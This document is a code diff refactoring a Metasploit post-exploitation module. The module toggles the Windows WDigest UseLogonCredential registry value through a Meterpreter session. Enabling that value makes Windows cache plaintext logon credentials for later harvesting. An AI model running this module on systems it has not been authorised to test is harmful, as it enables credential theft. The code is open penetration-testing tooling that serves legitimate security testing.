@@ -23,7 +23,12 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>'],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
@@ -34,9 +39,10 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
-    print_status("Running module against #{sysinfo['Computer']}")
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
+
     # Check if OS is 8/2012 or newer. If not, no need to set the registry key
     # Can be backported to Windows 7, 2k8R2 but defaults to enabled...
     version = get_version_info
@@ -50,56 +56,54 @@ class MetasploitModule < Msf::Post
   def get_key
     # Check if the key exists. Not present by default
     print_status("Checking if the #{WDIGEST_REG_LOCATION}\\#{USE_LOGON_CREDENTIAL} DWORD exists...")
-    begin
-      wdvalue = registry_getvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL)
-      key_exists = !wdvalue.nil?
+    wdvalue = registry_getvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL)
+    key_exists = !wdvalue.nil?
 
-      print_status("#{USE_LOGON_CREDENTIAL} is set to #{wdvalue}") if key_exists
-      return wdvalue
-    rescue Rex::Post::Meterpreter::RequestError => e
-      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
-    end
+    print_status("#{USE_LOGON_CREDENTIAL} is set to #{wdvalue}") if key_exists
+    return wdvalue
+  rescue Rex::Post::Meterpreter::RequestError => e
+    fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
   end
 
   def wdigest_enable
     wdvalue = get_key
     key_exists = !wdvalue.nil?
+
     # If it is not present, create it
-    if key_exists && wdvalue == 1
+    if wdvalue == 1
       print_good('Registry value is already set. WDigest Security Provider is enabled')
-    else
-      begin
-        verb = key_exists ? 'Setting' : 'Creating'
-        print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 1...")
-        if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 1, 'REG_DWORD')
-          print_good('WDigest Security Provider enabled')
-        else
-          print_error('Unable to access registry key - insufficient privileges?')
-        end
-      rescue Rex::Post::Meterpreter::RequestError => e
-        fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
-      end
+      return
     end
+
+    verb = key_exists ? 'Setting' : 'Creating'
+    print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 1...")
+    if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 1, 'REG_DWORD')
+      print_good('WDigest Security Provider enabled')
+    else
+      print_error('Unable to access registry key - insufficient privileges?')
+    end
+  rescue Rex::Post::Meterpreter::RequestError => e
+    fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
   end
 
   def wdigest_disable
     wdvalue = get_key
     key_exists = !wdvalue.nil?
+
     # If it is not present, create it
-    if key_exists && wdvalue == 0
+    if wdvalue == 0
       print_good('Registry value is already set. WDigest Security Provider is disabled')
-    else
-      begin
-        verb = key_exists ? 'Setting' : 'Creating'
-        print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 0...")
-        if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 0, 'REG_DWORD')
-          print_good('WDigest Security Provider disabled')
-        else
-          print_error('Unable to access registry key - insufficient privileges?')
-        end
-      rescue Rex::Post::Meterpreter::RequestError => e
-        fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
-      end
+      return
     end
+
+    verb = key_exists ? 'Setting' : 'Creating'
+    print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 0...")
+    if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 0, 'REG_DWORD')
+      print_good('WDigest Security Provider disabled')
+    else
+      print_error('Unable to access registry key - insufficient privileges?')
+    end
+  rescue Rex::Post::Meterpreter::RequestError => e
+    fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
   end
 end
